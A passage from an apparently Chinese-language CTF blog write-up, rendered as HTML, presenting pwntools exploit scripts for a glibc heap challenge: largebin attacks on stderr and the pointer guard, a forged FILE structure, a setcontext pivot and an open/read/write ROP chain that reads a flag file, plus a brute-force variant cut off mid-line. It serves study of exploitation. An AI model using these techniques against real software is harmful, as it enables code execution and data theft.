class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><p>根据setcontext+61，布置<code>rdx</code>周围，使寄存器满足条件</p><p><code>rsp</code>指向chunk 1，<code>rcx</code>指向ret，将栈迁移到chunk 1上</p><h3 id="orw-chain"><a href="#orw-chain" class="headerlink" title="orw chain"></a>orw chain</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line">tls_offset = <span class="number">0x3c0740</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">offset = <span class="number">0x300740</span></span><br><span class="line">tls_offset = offset</span><br><span class="line">tls_offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">tls_offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(tls_offset))</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line"><span class="comment">#size(0x40f,0x500]</span></span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">1</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">2</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span><span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">3</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, <span class="built_in">str</span></span>):</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">4</span>)</span><br><span class="line">pl += p8(index)</span><br><span class="line">pl += p16(size)</span><br><span class="line">pl += <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendit</span>():</span><br><span class="line"><span class="keyword">global</span> pl</span><br><span class="line">pl += p8(<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;opcode\n&quot;</span>, pl)</span><br><span class="line">pl = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">content, n</span>):</span><br><span class="line">num = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(num[n:]+num[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)<span class="comment">#largebins(9)-&gt;fakestderr(after attack pointerguard)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)<span class="comment">#(7)(8)-&gt;pointer guard</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">stderr_addr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">fixed_heap_fdbk = libc_base + <span class="number">0x1f30c0</span></span><br><span class="line">setcontex61 = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">point_guard = libc_base + tls_offset + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line">log.success(<span class="string">&quot;setcontex+61 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontex61)))</span><br><span class="line">log.success(<span class="string">&quot;point_guard = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(point_guard)))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">16</span>,cyclic(<span class="number">16</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x880</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack stderr</span></span><br><span class="line">payload = 